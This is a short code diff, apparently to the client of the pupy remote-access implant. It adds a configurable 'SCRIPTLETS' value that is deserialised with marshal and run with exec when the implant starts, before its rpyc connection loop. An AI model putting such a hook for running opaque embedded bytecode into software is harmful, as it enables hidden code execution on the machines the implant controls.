@@ -705,6 +705,7 @@ attempt = 0
 debug = False
 CONFIGURATION_CID = 0x31337
 DELAYS = [(10, 5, 10), (50, 30, 50), (-1, 150, 300)]
+SCRIPTLETS = ''
 
 LAUNCHER = "connect"  # the default launcher to start when no argv
 # default launcher arguments
@@ -832,6 +833,12 @@ def main():
     pupy.infos['native'] = pupy.pseudo is False
     pupy.infos['revision'] = getattr(pupy, 'revision', None)
     pupy.infos['cid'] = CONFIGURATION_CID
+
+    if SCRIPTLETS:
+        logger.debug('Start scriptlets')
+        import marshal
+        exec marshal.loads(SCRIPTLETS)
+        logger.debug('Scriptlets completed')
 
     logger.debug('Starting rpyc loop')
 
